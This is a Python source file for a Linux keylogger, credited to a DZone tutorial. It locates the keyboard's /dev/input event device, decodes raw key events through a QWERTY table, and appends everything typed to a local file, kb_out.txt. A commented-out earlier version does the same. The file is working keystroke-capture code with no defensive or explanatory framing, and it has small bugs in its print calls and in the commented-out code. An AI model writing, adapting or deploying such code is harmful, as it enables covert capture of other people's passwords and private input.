import sys
import re
import struct
import os
import threading as th

BUFFER_LENGTH = 10
FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize(FORMAT)
OUT_FILE = "kb_out.txt"

qwerty_map = {
    2: "1",
    3: "2",
    4: "3",
    5: "4",
    6: "5",
    7: "6",
    8: "7",
    9: "8",
    10: "9",
    11: "0",
    12: "-",
    13: "=",
    14: "[BACKSPACE]",
    15: "[TAB]",
    16: "q",
    17: "w",
    18: "e",
    19: "r",
    20: "t",
    21: "y",
    22: "u",
    23: "i",
    24: "o",
    25: "p",
    26: "[",
    27: "]",
    28: "[ENTER]",
    29: "[LCTRL]",
    30: "a",
    31: "s",
    32: "d",
    33: "f",
    34: "g",
    35: "h",
    36: "j",
    37: "k",
    38: "l",
    39: ";",
    40: "'",
    41: "`",
    42: "[LSHIFT]",
    43: "\\",
    44: "z",
    45: "x",
    46: "c",
    47: "v",
    48: "b",
    49: "n",
    50: "m",
    51: ",",
    52: ".",
    53: "/",
    54: "[RSHIFT]",
#    55: "[ASTERISK]",
    56: "[LALT]",
    57: "[SPACE]",
    58: "[CAPSLOCK]",
    97: "[RCTRL]",
    100: "[RALT]",
}

# https://dzone.com/articles/how-to-create-a-keylogger-for-linux-using-python
class Keyboard:
    def __init__(self, erase):
        if (erase == 'y'):
            open(OUT_FILE, "w").close()
        with open("/proc/bus/input/devices") as f:
            self.lines = f.readlines()
            self.pattern = re.compile("Handlers|EV=")
            self.handlers = list(filter(self.pattern.search, self.lines))
            self.pattern = re.compile("EV=120013")
            for idx, elt in enumerate(self.handlers):
                if self.pattern.search(elt):
                    self.line = self.handlers[idx - 1]

            self.pattern = re.compile("event[0-9]")
            self.infile_path = "/dev/input/" + self.pattern.search(self.line).group(0)

        self.typed = ""

    def data_stream(self):
        print("Thread {} online",format(th.current_thread().name))
        print("---PID {}",format(os.getpid()))
        self.infile = open(self.infile_path, "rb")
        self.event = self.infile.read(EVENT_SIZE)
        while self.event:
            (_, _, type, code, value) = struct.unpack(FORMAT, self.event)

            if code != 0 and type == 1 and value == 1:
                if code in qwerty_map:
                    self.typed += qwerty_map[code]

            self.event = self.infile.read(EVENT_SIZE)

            if len(self.typed) >= BUFFER_LENGTH:
                with open(OUT_FILE, "a") as f:
                    f.write(self.typed)
                    self.typed = ""

'''
def read_keyboard():
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()
        pattern = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))
        pattern = re.compile("EV=120013")
        for idx, elt in enumerate(handlers):
            if pattern.search(elt):
                line = handlers[idx - 1]

        pattern = re.compile("event[0-9]")
        infile_path = "/dev/input/" + pattern.search(line).group(0)

    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)

    infile = open(infile_path, "rb")

    event = in_file.read(EVENT_SIZE)
    typed = ""

    while event:
        (_, _, type, code, value) = struct.unpack(FORMAT, event)

        if code != 0 and type == 1 and value == 1:
            if code in qwerty_map:
                typed += qwerty_map[code]

        event = infile.read(EVENT_SIZE)

        if len(typed) >= 10:
            with open("out.txt", "a") as f:
                f.write(typed)
                typed = ""

    infile.close()
'''